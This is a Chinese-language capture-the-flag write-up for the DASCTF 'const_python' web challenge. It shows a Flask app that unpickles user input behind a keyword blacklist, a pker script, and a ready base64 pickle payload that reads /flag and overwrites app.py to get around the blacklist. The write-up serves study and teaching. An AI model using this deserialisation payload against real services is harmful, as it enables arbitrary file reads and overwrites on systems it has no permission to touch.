---
title: DASCTF 2024最后一战｜寒夜破晓，冬至终章 const_python WP
date: 2025/04/29 01:08:20
tags: [Web, CTF]
categories: WriteUps
filename: dasctf_const_python.md
permalink: dasctf_const_python.html
---

----
[参考WP](https://xz.aliyun.com/news/16303)

[pker 学习](https://xz.aliyun.com/news/6608)

[pker](https://github.com/EddieIvan01/pker#)

## 解题过程

根据题目提示，访问路由 src，获得源代码：

```python

import builtins
import io
import sys
import uuid
from flask import Flask, request,jsonify,session
import pickle
import base64


app = Flask(__name__)

app.config['SECRET_KEY'] = str(uuid.uuid4()).replace("-", "")


class User:
    def __init__(self, username, password, auth='ctfer'):
        self.username = username
        self.password = password
        self.auth = auth

password = str(uuid.uuid4()).replace("-", "")
Admin = User('admin', password,"admin")

@app.route('/')
def index():
    return "Welcome to my application"


@app.route('/login', methods=['GET', 'POST'])
def post_login():
    if request.method == 'POST':

        username = request.form['username']
        password = request.form['password']


        if username == 'admin' :
            if password == admin.password:
                session['username'] = "admin"
                return "Welcome Admin"
            else:
                return "Invalid Credentials"
        else:
            session['username'] = username


    return '''
        <form method="post">
        <!-- /src may help you>
            Username: <input type="text" name="username"><br>
            Password: <input type="password" name="password"><br>
            <input type="submit" value="Login">
        </form>
    '''


@app.route('/ppicklee', methods=['POST'])
def ppicklee():
    data = request.form['data']

    sys.modules['os'] = "not allowed"
    sys.modules['sys'] = "not allowed"
    try:

        pickle_data = base64.b64decode(data)
        for i in {"os", "system", "eval", 'setstate', "globals", 'exec', '__builtins__', 'template', 'render', '\\',
                 'compile', 'requests', 'exit',  'pickle',"class","mro","flask","sys","base","init","config","session"}:
            if i.encode() in pickle_data:
                return i+" waf !!!!!!!"

        pickle.loads(pickle_data)
        return "success pickle"
    except Exception as e:
        return "fail pickle"


@app.route('/admin', methods=['POST'])
def admin():
    username = session['username']
    if username != "admin":
        return jsonify({"message": 'You are not admin!'})
    return "Welcome Admin"


@app.route('/src')
def src():
    return  open("app.py", "r",encoding="utf-8").read()

if __name__ == '__main__':
    app.run(host='0.0.0.0', debug=False, port=5000)
```

分析代码可知，我们的主要目标是通过 pickle RCE 获得 config['secret']。

构造 pickle payload：

----



wait！ 在此之前我们先学习一下什么是 pickle：

`pickle` 是 Python 的**序列化/反序列化**模块。

	它能把 Python 对象保存成字节流（序列化），也能把字节流还原成对象（反序列化）。
	
	**问题是**：`pickle.loads()` 在反序列化时会**执行**字节流里的指令，所以如果不可信的数据被反序列化，就可以执行任意代码，导致 **远程代码执行（RCE）漏洞**。

想要生成一个 pickle 序列化 bytes，可以这样做：

```python
import pickle

class A:
    def __reduce__(self):
        return (print, ("helloworld!", ))

payload = pickle.dumps(A())
```

`__reduce__` 用于告诉 pickle 怎样序列化这个 Python 对象，其中 return 的第一个变量是一个函数对象，指定使用什么函数来序列化这个对象，之后跟着一个元组，它是传递给前面的函数对象的参数。需要注意的是，如果传递的元组**长度为 1**，一定要记得在后面加上一个 `,`。

But! 使用python官方的代码来生成 payload 限制很大，而且也不大精细，因此，我们可以使用大佬写的 pker 来生成序列化字节流。

pker 的教程见文首的文章。

----

现在我们来尝试构造本题的 payload。读这部分代码，发现可以使用 open, write：

```python
@app.route('/ppicklee', methods=['POST'])
def ppicklee():
    # 获取 pickle payload
    data = request.form['data']

    # 禁止使用 os 和 sys
    sys.modules['os'] = "not allowed"
    sys.modules['sys'] = "not allowed"
    
    try:
        pickle_data = base64.b64decode(data)
        # 不允许出现下列字符串
        for i in {"os", "system", "eval", 'setstate', "globals", 'exec', '__builtins__', 'template', 'render', '\\',
                 'compile', 'requests', 'exit',  'pickle',"class","mro","flask","sys","base","init","config","session"}:
            if i.encode() in pickle_data:
                return i+" waf !!!!!!!"

        pickle.loads(pickle_data)
        return "success pickle"
    except Exception as e:
        return "fail pickle"
```

> 补充一个知识点：
>
> 在 jinjia 模板中，能够使用类似 `''['__class__']` 的方式来访问某一个对象的属性，这是 jinjia 引擎提供的特性，它会在找不到字典键的时候将他转换成  `getattr('', '__class__')`，但是这种方式在正常的代码中是不可行的，只能使用 `''.__class__` 的方式来获取。（是的，理论上我们可以使用 getattr 来生成完成这个题目）
## Payload

``` python
getattr = GLOBAL('builtins', 'getattr')  # 从内置函数中获取 getattr 这个内置函数
open = GLOBAL('builtins', 'open')        # 同样，我们获取到 open 这个内置函数
f = open('/flag')                        # 获取到 flag 的文件对象
read = getattr(f, 'read')                # 注意，这个地方的 read 是独属于 f 文件对象的 read，相当于 read = f.read
content = read()                         # 获取到 flag 的内容
src = open('./app.py', 'w')              # 获取到源代码的文件对象，这是我们唯一一个我们能拿到回显的地方了
write = getattr(src, 'write')            # 拿到源代码的 write 函数
write(content)                           # 写入
return                                   # 返回
```

然后使用 pker 生成 payload

``` bash
python pker.py < payload.txt
```

得到一个 python 样式的字节流 `b''`，注意这个地方不要直接放到 cyber chef 中，因为他不会转义 `\n`，要么使用 python 先输出（因为没有中文），要么直接使用 python 拿到 b64:

``` python
import base64
base64.urlsafe_b64encode(b"cbuiltins\ngetattr\np0\n0cbuiltins\nopen\np1\n0g1\n(S'/flag'\ntRp2\n0g0\n(g2\nS'read'\ntRp3\n0g3\n(tRp4\n0g1\n(S'./app.py'\nS'w'\ntRp5\n0g0\n(g5\nS'write'\ntRp6\n0g6\n(g4\ntR.")
```

然后丢到 `/ppicklee` 中，访问 /src 拿到 flag 回显就可以了。

## 长长脑子

下面小小尝试一下使用 python 官方代码进行序列化，对照上面的代码，得到：

```python
import pickle

class RCE:
    def process():
        open('./app.py', 'w').write(open('/flag').read())
    
    def __reduce__(self):
        return (process)

payload = pickle.dumps(RCE())
```

显然，我失败了，原因是 `__reduce__` 这个函数执行的时候 self 对象已经不存在了，也就是说其他相应的成员函数也随之被销毁了，那么可不可以把函数写在外面呢？可以，如果你的 payload 在这个文件里面被解析，当然可以，可惜你的payload是在别人的代码中执行。。。 

因此，我也算是明白使用 python 官方的代码为什么会说限制很大了。。而且这个官方代码不允许嵌套调用。

